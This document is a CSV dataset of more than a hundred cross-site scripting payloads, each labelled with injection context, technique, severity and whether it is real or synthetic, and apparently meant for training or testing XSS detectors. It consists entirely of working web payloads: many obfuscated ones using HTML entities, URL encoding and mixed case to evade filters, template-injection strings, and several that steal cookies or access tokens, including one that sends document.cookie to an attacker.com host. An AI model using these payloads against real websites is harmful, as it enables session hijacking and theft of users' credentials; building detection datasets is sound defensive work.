payload,context,technique,severity,length,source
<noscript	onpaste=confirm(location.hash)>,tag_injection,synthetic,medium,41,synthetic
\%27 onclick=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,33,synthetic
<summary onpointermove=alert(1) style=display:block>AnonKryptiQuz</summary>,tag_injection,none,medium,75,real
"setTimeout(%22eval(btoa(document.cookie))%22,0)",dom_sink,synthetic,high,47,synthetic
"'%3E%3Cimg src=x onpointerover=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,76,synthetic
"""><blink onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,72,synthetic
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",tag_injection,none,medium,117,real
""" ><svg onmous&#101;down=confirm(1)>",attribute_escape,synthetic,medium,36,synthetic
<!--><VidEo OnmOzfUllScrEenChaNge=prOmpT('XSS')>,tag_injection,synthetic,medium,48,synthetic
"<style>:target {transform: rotate(180deg);}</style><br id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></br>",tag_injection,none,medium,122,real
"OndBlcLicK=pRomPt/**/(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,52,synthetic
"onfullscreenchange=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,61,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,low,144,synthetic
"<seLecT
oNpoIntErmOve=prOmpT('XSS')>",tag_injection,synthetic,medium,36,synthetic
<a2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</a2><input value=clickme>,tag_injection,none,medium,95,real
onwh&#101;&#101;l=prompt(1),event_handler,synthetic,medium,27,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",tag_injection,none,medium,105,real
onwh&#101;&#101;l=j&#97;v&#97;script:prompt(1),event_handler,synthetic,medium,46,synthetic
"%22><img src=x onmouseup=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
<blink onpopstate=console.log(document.domain)>,tag_injection,synthetic,medium,47,synthetic
""" %3E%3Csvg onwaiting=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,62,synthetic
"%22 onmouseover=console.log(String.fromCharCode(88,83,83)) x=%22",attribute_escape,synthetic,high,64,synthetic
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,generic,none,medium,108,real
""" %3E%3Csvg onmousewheel=alert(1)%3E",attribute_escape,synthetic,medium,36,synthetic
"<blockquote onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,96,real
"<script>new Image().src=""http://localhost/cookie.php?c=""+localStorage.getItem('access_token');</script>",dom_sink,none,high,103,real
"<style>:target {color: red;}</style><image3 id=x style=""transition:color 10s"" ontransitioncancel=print()></image3>",tag_injection,none,low,114,real
"<shadow draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</shadow>",tag_injection,none,medium,68,real
""" onfocus=confirm('XSS') autofocus=""",attribute_escape,synthetic,medium,36,synthetic
' ><svg ondrop=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,37,synthetic
"<mark onmouseup=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,47,real
"SetIntErvAl(""prOmpT(1)"",100)",dom_sink,synthetic,high,28,synthetic
<t&#101;mpl&#97;t&#101; onclos&#101;=consol&#101;.log(1) onclos&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,90,synthetic
""" oNfoCus=prOmpT(lOcaTioN.hAsh) """,attribute_escape,synthetic,medium,33,synthetic
"<mark onmouseenter=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,50,real
%27 ><svg onwebkitanimationend=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,50,synthetic
&quot; oncut=alert('XSS') x=&quot;,attribute_escape,synthetic,medium,34,synthetic
document.getElementById('btn').onclick = function(e){,dom_sink,none,low,53,real
"""><Img srC=x onBefOreCut=alErt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,48,synthetic
"<u draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,58,real
""" onscrollend=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,57,synthetic
OnlOad=alErt&#40;dOcuMenT.dOmaIn&#41;,event_handler,synthetic,low,37,synthetic
""" onpagehide=console.log(document.domain) """,attribute_escape,synthetic,medium,43,synthetic
' ongotpointercapture=console.log(document.domain) ',attribute_escape,synthetic,medium,52,synthetic
' ><svg onwebkitfullscreenchange=\u0061lert('XSS')>,attribute_escape,synthetic,low,51,synthetic
<arEa OncLosE=pRomPt(1) OncLosE=pRomPt(1)>,tag_injection,synthetic,medium,42,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)>"")",dom_sink,synthetic,high,196,synthetic
%3cscript%3ealert('XSS')%3c/script%3e,generic,url_encoding,medium,37,real
"<html onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</html>",tag_injection,none,medium,67,real
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>,tag_injection,none,medium,44,real
' oNmoUseEntEr=AleRt(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,37,synthetic
'><img src=x onpl&#97;y=confirm('XSS')>,attribute_escape,synthetic,medium,39,synthetic
<body oninv&#97;lid=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,low,59,synthetic
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionend=alert(1)></tbody>",tag_injection,none,medium,108,real
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable style=display:block>drop here</bdi>",tag_injection,none,medium,127,real
`><img src=x on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,57,synthetic
""" ><svG oNpaGehIde=coNfiRm(1)>",attribute_escape,synthetic,medium,30,synthetic
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable style=display:block>drop here</sub>",tag_injection,none,medium,127,real
`><Img srC=x onPauSe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,46,synthetic
%3Cmath src=x onpromptaction=prompt(1)%3E,tag_injection,synthetic,medium,41,synthetic
'?prompt`AnonKryptiQuz`?',attribute_escape,none,low,25,real
' ><svg ondrop=confirm(1)>,attribute_escape,synthetic,medium,26,synthetic
"<IMG """"""><SCRIPT>alert(""AnonKryptiQuz"")</SCRIPT>"">",script_injection,case_variation,medium,50,real
"<abbr onmouseleave=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,50,real
<acronym onpointermove=alert(1) style=display:block>AnonKryptiQuz</acronym>,tag_injection,none,medium,75,real
"<audio onmouseenter=""alert(1)"">AnonKryptiQuz</audio>",tag_injection,none,medium,52,real
onsearch=console.log/***/('XSS'),event_handler,synthetic,low,32,synthetic
"<animatetransform onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",tag_injection,none,medium,108,real
<marquee/onstart=c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))>,tag_injection,encoding,high,78,real
"""><img src=x onplay=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
""" onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,78,synthetic
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS'),event_handler,synthetic,medium,54,synthetic
<plAinTexT/oNrePeaT=pRomPt('XSS')>,tag_injection,synthetic,medium,34,synthetic
"<acronym onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,67,real
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",tag_injection,none,medium,166,real
&#106;&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh),js_uri,synthetic,medium,54,synthetic
document.querySelector(%22body%22).innerHTML+=%22alert(btoa(document.cookie))%22,dom_sink,synthetic,high,80,synthetic
&lt;SCRIPT&gt;alert(/AnonKryptiQuz/&#46;source)&lt;/SCRIPT&gt;,generic,html_entity,medium,62,real
ondrop=javascript:prompt(location.hash),event_handler,synthetic,medium,39,synthetic
<!--><xmp ontr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,73,synthetic
""" onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,low,77,synthetic
"J&#97;VasCriPt:ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,high,57,synthetic
"<nextid draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",tag_injection,none,medium,90,real
"' %3E%3Csvg ondragover=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
"<custom tags oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,105,real
<script /**/>/**/alert(/AmoloHT/)/**/</script /**/,script_injection,comment_injection,medium,50,real
"<script>alert(document.domain.concat(""\n"").concat(window.origin))</script>",dom_sink,none,medium,74,real
"<nav onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",tag_injection,none,medium,59,real
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,generic,none,medium,35,real
 onw&#101;bkit&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,73,synthetic
<body oninput=javascript:alert(5675)><input autofocus>,js_uri,none,medium,54,real
"<em draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</em>",tag_injection,none,medium,60,real
"__proto__[""onmousedown""]=eval(document.cookie)",dom_sink,synthetic,high,46,synthetic
""" ><svG oNanImaTioNitEraTioN=cOnsOle.loG('XSS')>",attribute_escape,synthetic,medium,48,synthetic
<titl&#101; onblur=consol&#101;.log(loc&#97;tion.h&#97;sh) onblur=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,106,synthetic
{{7*%277%27}},template_injection,synthetic,low,13,synthetic
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></source>",tag_injection,none,medium,116,real
"""""><img src=y onerror=confirm(1)>",tag_injection,none,medium,33,real
"element.setAttribute(""onclick"",""confirm('XSS')"")",dom_sink,synthetic,medium,48,synthetic
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",js_uri,case_variation,medium,48,real
"<abbr draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,66,real
' onvolumechange=confirm('XSS') ',attribute_escape,synthetic,medium,33,synthetic
<output onpointermove=alert(1) style=display:block>AnonKryptiQuz</output>,tag_injection,none,medium,73,real
"setTimeout(%22fetch(btoa(document.cookie))%22,0)",dom_sink,synthetic,high,48,synthetic
"<source
onvolumechange=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,62,synthetic
"""><img src=x onh&#97;shch&#97;ng&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,73,synthetic
{{constructor.constructor('\u0061lert(document.domain)')()}},template_injection,synthetic,low,60,synthetic
' ><svg onsecuritypolicyviolation=prompt(1)>,attribute_escape,synthetic,medium,44,synthetic
"<embed onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,69,real
%27 ><svg ontouchend=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,44,synthetic
%3Cbase x=y onkeydown=alert('XSS')%3E,tag_injection,synthetic,medium,37,synthetic
"'%3E%3Cimg src=x oninvalid=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
" onTraNsiTioNstArt=prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,56,synthetic
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""coNsoLe.Log(1)""",dom_sink,synthetic,high,58,synthetic
<image	onchange=alert(1)>,tag_injection,synthetic,medium,25,synthetic
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a",js_uri,synthetic,medium,69,synthetic
""" ><svG oNfoCusOut=coNsoLe.Log(loCatIon.haSh)>",attribute_escape,synthetic,medium,46,synthetic
